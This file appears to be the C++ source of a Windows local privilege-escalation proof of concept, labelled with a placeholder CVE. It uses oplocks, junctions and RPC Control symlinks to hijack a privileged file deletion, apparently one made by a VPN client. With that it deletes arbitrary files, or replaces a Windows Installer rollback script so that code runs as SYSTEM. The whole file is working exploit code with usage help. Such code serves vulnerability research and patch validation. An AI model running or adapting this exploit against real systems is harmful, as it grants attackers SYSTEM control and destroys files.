#include <Windows.h>
#include <Shlwapi.h>
#include <Msi.h>
#include <PathCch.h>
#include <AclAPI.h>
#include <iostream>
#include "resource.h"
#include "def.h"
#include "FileOplock.h"
#pragma comment(lib, "Msi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "PathCch.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma warning(disable:4996)

FileOpLock* oplock;
HANDLE hFile, hFile2, hFile3;
HANDLE hthread;
NTSTATUS retcode;
HMODULE hm = GetModuleHandle(NULL);
WCHAR dir[MAX_PATH] = { 0x0 };
WCHAR dir2[MAX_PATH] = { 0x0 };
WCHAR file[MAX_PATH] = { 0x0 };
WCHAR file2[MAX_PATH] = { 0x0 };
WCHAR file3[MAX_PATH] = { 0x0 };
WCHAR targetDeleteFile[MAX_PATH] = { 0x0 };


DWORD WINAPI install(void*);
BOOL Move(HANDLE hFile);
void callback();
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);
LPWSTR  BuildPath(LPCWSTR path);
void load();
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target);
VOID Fail();
VOID cb1();
VOID cb2();
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
LPWSTR CreateTempDirectory();
BOOL DeleteJunction(LPCWSTR dir);
void Trigger1();
void Trigger2();
void Bait(LPWSTR file);


BYTE* buffer_payload(HANDLE file, OUT size_t& r_size)
{

	HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0);
	if (!mapping) {
		std::cerr << "[X] Could not create mapping!" << std::endl;
		CloseHandle(file);
		return nullptr;
	}
	BYTE* rawData = (BYTE*)MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
	if (rawData == nullptr) {
		std::cerr << "[X] Could not map view of file" << std::endl;
		CloseHandle(mapping);
		CloseHandle(file);
		return nullptr;
	}
	r_size = GetFileSize(file, 0);
	BYTE* localCopyAddress = (BYTE*)VirtualAlloc(NULL, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (localCopyAddress == NULL) {
		std::cerr << "Could not allocate memory in the current process" << std::endl;
		return nullptr;
	}
	memcpy(localCopyAddress, rawData, r_size);
	UnmapViewOfFile(rawData);
	CloseHandle(mapping);
	return localCopyAddress;
}

DWORD WINAPI install(void*) {
	HMODULE hm = GetModuleHandle(NULL);

	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_MSI1), L"msi");
	wchar_t msipackage[MAX_PATH] = { 0x0 };
	GetTempFileName(L"C:\\windows\\temp\\", L"MSI", 0, msipackage);
	printf("[*] MSI file: %ls\n", msipackage);
	DWORD MsiSize = SizeofResource(hm, res);
	void* MsiBuff = LoadResource(hm, res);

	HANDLE pkg = CreateFile(msipackage, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(pkg, MsiBuff, MsiSize, NULL, NULL);
	CloseHandle(pkg);
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	UINT a = MsiInstallProduct(msipackage, L"ACTION=INSTALL");
	if (a != ERROR_SUCCESS) {
		printf("[!] MSI installation failed with error code %d!\n", a);
		return FALSE;
	}
	printf("[!] MSI installation successfully\n");

	MsiInstallProduct(msipackage, L"REMOVE=ALL");
	DeleteFile(msipackage);
	return 0;
}
BOOL Move(HANDLE hFile) {
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Invalid handle!\n");
		return FALSE;
	}
	wchar_t tmpfile[MAX_PATH] = { 0x0 };
	RPC_WSTR str_uuid;
	UUID uuid = { 0 };
	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	_swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
	size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
	FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
	IO_STATUS_BLOCK io = { 0 };
	rename_info->ReplaceIfExists = TRUE;
	rename_info->RootDirectory = NULL;
	rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
	rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
	memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
	NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
	if (status != 0) {
		return FALSE;
	}
	return TRUE;
}

void callback() {

	printf("[+] Oplock triggered on C:\\Config.msi!\n");

	SetThreadPriority(GetCurrentThread(), REALTIME_PRIORITY_CLASS);
	Move(hFile);
	printf("[+] C:\\Config.msi moved!\n");

	//loop until the directory found
	printf("[+] Create thread to invokes the Windows Installer service to install our .msi\n");
	hthread = CreateThread(NULL, NULL, install, NULL, NULL, NULL);
	HANDLE hd;
	
	do {
		hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
	} while (!hd);
	CloseHandle(hd);
	do {
		CloseHandle(hd);
		hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
	} while (hd);
	CloseHandle(hd);
	do {
		hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
		CloseHandle(hd);
	} while (retcode != 0xC0000022);
	printf("[+] C:\\Config.msi created\n");
}

HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
	UNICODE_STRING ufile;
	HANDLE hDir;
	pRtlInitUnicodeString(&ufile, file);
	OBJECT_ATTRIBUTES oa = { 0 };
	IO_STATUS_BLOCK io = { 0 };
	InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

	retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

	if (!NT_SUCCESS(retcode)) {
		return NULL;
	}
	return hDir;
}
LPWSTR  BuildPath(LPCWSTR path) {
	wchar_t ntpath[MAX_PATH];
	swprintf(ntpath, L"\\??\\%s", path);
	return ntpath;
}
void load() {
	HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
	if (ntdll != NULL) {
		pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
		pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
		pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

	}
	if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
		printf("Cannot load api's %d\n", GetLastError());
		exit(0);
	}
}
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
	HANDLE hJunction;
	DWORD cb;
	wchar_t printname[] = L"";
	HANDLE hDir;
	hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to obtain handle on directory %ls.\n", dir);
		return FALSE;
	}

	SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
	SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
	SIZE_T PathLen = TargetLen + PrintnameLen + 12;
	SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
	PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
	Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	Data->ReparseDataLength = PathLen;
	Data->Reserved = 0;
	Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
	Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);

	if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
	{
		printf("[+] Junction %ls -> %ls created!\n", dir, target);
		free(Data);
		return TRUE;

	}
	else
	{
		printf("[!] Error on creating junction %ls -> %ls : Error code %d\n", dir, target, GetLastError());
		free(Data);
		return FALSE;
	}
}
BOOL DeleteJunction(LPCWSTR path) {
	REPARSE_GUID_DATA_BUFFER buffer = { 0 };
	BOOL ret;
	buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	DWORD cb = 0;
	IO_STATUS_BLOCK io;


	HANDLE hDir;
	hDir = CreateFile(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_REPARSE_POINT, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to obtain handle on directory %ls.\n", path);
		printf("%d\n", GetLastError());
		return FALSE;
	}
	ret = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL);
	if (ret == 0) {
		printf("Error: %d\n", GetLastError());
		return FALSE;
	}
	else
	{
		printf("[+] Junction %ls deleted!\n", dir);
		return TRUE;
	}
}
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
		printf("[+] Symlink %ls -> %ls created!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("[!] Error in creating Symlink : %d\n", GetLastError());
		return FALSE;
	}
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
		printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
		return TRUE;
	}
	else
	{
		printf("[!] Error in deleting Symlink : %d\n", GetLastError());
		return FALSE;
	}
}
VOID cb1() {
	
	printf("[+] Oplock triggered on %ls!\n", file);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Fail, NULL, 0, NULL);
	
	if (!Move(hFile2)) {
		printf("[!] Failed to move file %ls!\n", file);
		exit(1);
	}
	printf("[+] File %ls moved!\n", file);
	if (!CreateJunction(BuildPath(dir), L"\\RPC Control")) {
		printf("[!] Failed to create junction! Exiting!\n");
		exit(1);
	}
	if (!DosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\12345.txt", targetDeleteFile)) {
		printf("[!] Failed to create symlink! Exiting!\n");
		exit(1);
	}

}

LPWSTR CreateTempDirectory() {
	wchar_t wcharPath[MAX_PATH];
	if (!GetTempPathW(MAX_PATH, wcharPath)) {
		printf("failed to get temp path");
		return NULL;
	}

	srand(time(NULL));
	int n = rand() % 1000000;

	_swprintf(dir, L"%swaapi-%d", wcharPath, n);
	printf("[+] Folder %ls created!\n", dir);
	_swprintf(file, L"%s\\12345.txt", dir);
	HANDLE hDir = myCreateDirectory(BuildPath(dir), FILE_WRITE_DATA, FILE_SHARE_READ, FILE_CREATE);
	if (hDir == NULL) {
		printf("Error on directory creation");
		return NULL;
	}
	CloseHandle(hDir);
	
	return file;
}
void Trigger1() {
	CreateTempDirectory();
	FileOpLock* oplock;
	do {
		hFile2 = CreateFile(file, GENERIC_READ | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
	} while (hFile2 == INVALID_HANDLE_VALUE);

	printf("[+] File %ls created!!\n", file);
	printf("[+] Create OpLock on %ls!\n", file);
	printf("[*] Ready! Connect VPN to trigger the vulnerability\n");
	printf("[*] Or for testing purposes, execute \"del %ls\" as admin or SYSTEM\n", file);

	oplock = FileOpLock::CreateLock(hFile2, cb1);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	printf("[+] OpLock released on %ls!\n", file);
}

VOID Fail() {
	
	Sleep(5000);
	printf("[!] Race condtion failed!\n");
	DeleteJunction(dir);
	DelDosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\12345.txt", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION");
	exit(1);
	
}

VOID cb2() {

	printf("[+] Oplock triggered on %ls!\n", file2);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Fail, NULL, 0, NULL);

	DeleteJunction(dir);
	if (!CreateJunction(BuildPath(dir), L"\\RPC Control")) {
		printf("[!] Failed to create junction! Exiting!\n");
		exit(1);
	}
	if (!DosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\12345.txt", targetDeleteFile)) {
		printf("[!] Failed to create symlink! Exiting!\n");
		exit(1);
	}


}

LPWSTR CreateTempDirectory2() {

	wchar_t wcharPath[MAX_PATH];
	if (!GetTempPathW(MAX_PATH, wcharPath)) {
		printf("failed to get temp path");
		return NULL;
	}

	srand(time(NULL));
	int n = rand() % 1000000;

	_swprintf(dir, L"%swaapi-%d", wcharPath, n);
	printf("[+] Folder %ls created!\n", dir);
	HANDLE hDir = myCreateDirectory(BuildPath(dir), FILE_WRITE_DATA, FILE_SHARE_READ, FILE_CREATE);
	if (hDir == NULL) {
		printf("Error on directory creation");
		return NULL;
	}
	CloseHandle(hDir);

	_swprintf(dir2, L"%sfakedir-%d", wcharPath, n);
	printf("[+] Folder %ls created!\n", dir2);
	_swprintf(file2, L"%s\\11111.txt", dir2);
	_swprintf(file3, L"%s\\12345.txt", dir2);
	hDir = myCreateDirectory(BuildPath(dir2), FILE_WRITE_DATA, FILE_SHARE_READ, FILE_CREATE);
	if (hDir == NULL) {
		printf("Error on directory creation");
		return NULL;
	}
	CloseHandle(hDir);

	return file;
}

void Trigger2() {

	CreateTempDirectory2();
	FileOpLock* oplock;
	do {
		hFile2 = CreateFile(file2, GENERIC_READ | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
	} while (hFile2 == INVALID_HANDLE_VALUE);

	printf("[+] File %ls created!\n", file2);
	do {
		hFile3 = CreateFile(file3, GENERIC_READ | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
	} while (hFile3 == INVALID_HANDLE_VALUE);

	printf("[+] File %ls created!\n", file3);

	if (!CreateJunction(BuildPath(dir), BuildPath(dir2))) {
		printf("[!] Failed to create junction! Exiting!\n");
		exit(1);
	}

	printf("[+] Create OpLock on %ls!\n", file2);
	printf("[*] Ready! Connect VPN to trigger the vulnerability\n");
	printf("[*] Or for testing purposes, execute \"del %ls\\*\" as admin or SYSTEM\n", dir);

	oplock = FileOpLock::CreateLock(hFile2, cb2);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	printf("[+] OpLock released on %ls!\n", file2);


}

void PE(wchar_t* payloadPath, void (*Trigger)(void)) {

	size_t RbsSize = 0;
	HANDLE hRbs = CreateFile(payloadPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	BYTE* RbsBuff = buffer_payload(hRbs, RbsSize);
	CloseHandle(hRbs);

	hFile = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[!] Failed to create C:\\Config.msi directory. Trying to delete it.\n");
		install(NULL);
		hFile = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			printf("[+] Successfully removed and recreated C:\\Config.Msi.\n");
		}
		else
		{
			printf("[!] Failed. Cannot remove c:\\Config.msi");
			return;
		}
	}
	if (!PathIsDirectoryEmpty(L"C:\\Config.Msi"))
	{
		printf("[!] Failed.  C:\\Config.Msi already exists and is not empty.\n");
		return;
	}

	printf("[+] Config.msi directory created!\n");
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Trigger, NULL, NULL, NULL);

	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	SetThreadPriorityBoost(GetCurrentThread(), TRUE);      // This lets us maintain express control of our priority
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	//wait for deletion of folder C:\Config.msi
	printf("[+] Create OpLock on C:\\Config.msi!\n");
	oplock = FileOpLock::CreateLock(hFile, callback);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	printf("[+] OpLock released on C:\\Config.msi!\n");

	//attempt to create new C:\Confit.msi with weak DACL
	do {
		hFile = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF);
	} while (!hFile);
	printf("[+] C:\\Config.msi created with weak DACL\n");

	char buff[4096];
	DWORD retbt = 0;
	FILE_NOTIFY_INFORMATION* fn;
	WCHAR* fileName;
	WCHAR* extension2;
	printf("[+] Waits for Windows Installer to create an .rbs file\n");
	do {
		ReadDirectoryChangesW(hFile, buff, sizeof(buff) - sizeof(WCHAR), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME,
			&retbt, NULL, NULL);
		fn = (FILE_NOTIFY_INFORMATION*)buff;
		size_t sz = fn->FileNameLength / sizeof(WCHAR);
		fn->FileName[sz] = '\0';
		fileName = fn->FileName;
		PathCchFindExtension(fileName, MAX_PATH, &extension2);
	} while (wcscmp(extension2, L".rbs") != 0);

	SetSecurityInfo(hFile, SE_FILE_OBJECT, UNPROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
	printf("[+] C:\\Config.msi was set with weak DACL\n");

	while (!Move(hFile)) {
	}
	printf("[+] C:\\Config.msi moved!\n");

	HANDLE cfg_h = myCreateDirectory(BuildPath(L"C:\\Config.msi"), FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE);
	printf("[+] C:\\Config.msi created!\n");
	WCHAR rbsfile[MAX_PATH];
	_swprintf(rbsfile, L"C:\\Config.msi\\%s", fn->FileName);
	HANDLE rbs = CreateFile(rbsfile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (WriteFile(rbs, RbsBuff, RbsSize, NULL, NULL)) {
		printf("[+] Rollback script overwritten with ours!\n");
	}
	else
	{
		printf("[!] Failed to overwrite rbs file!\n");
	}
	CloseHandle(rbs);
	CloseHandle(cfg_h);
	return;
}

void printHelp() {
	printf(
		"CVE-XXXXX \n"
		"More info: https://github.com/Hagrid29/CVE-XXX/\n"
	);
	printf(
		".\\PoC.exe <operation> <argument> <method>\n"
		"<operation> <argument>:\n"
		"\tdel <target file path>: delete file\n"
		"\tpe <RollbackScript.rbs>: execute rollback script with SYSTEM privilege\n"
		"<method>:\n"
		"\t1 or 2 \n"
	);
	return;
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc < 4) {
		printHelp();
		return 0;
	}
	load();

	// PoC.exe del C:\windows\test.txt 1
	// PoC.exe del C:\windows\test.txt 2
	if (wcscmp(argv[1], L"del") == 0) {
		_swprintf(targetDeleteFile, L"\\??\\%s", argv[2]);
		if (wcscmp(argv[3], L"1") == 0) {
			Trigger1();
		}
		else if (wcscmp(argv[3], L"2") == 0) {
			Trigger2();
		}
		else {
			printHelp();
			return 0;
		}
	}
	// PoC.exe pe RollbackScript.rbs 1
	// PoC.exe pe RollbackScript.rbs 2
	else if (wcscmp(argv[1], L"pe") == 0) {
		_swprintf(targetDeleteFile, L"%s", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION");
		if (wcscmp(argv[3], L"1") == 0) {
			PE(argv[2], Trigger1);
		}
		else if (wcscmp(argv[3], L"2") == 0) {
			PE(argv[2], Trigger2);
		}
		else {
			printHelp();
			return 0;
		}
	}
	else {
		printHelp();
		return 0;
	}

	DeleteJunction(dir);
	DelDosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\12345.txt", targetDeleteFile);
	return 0;

}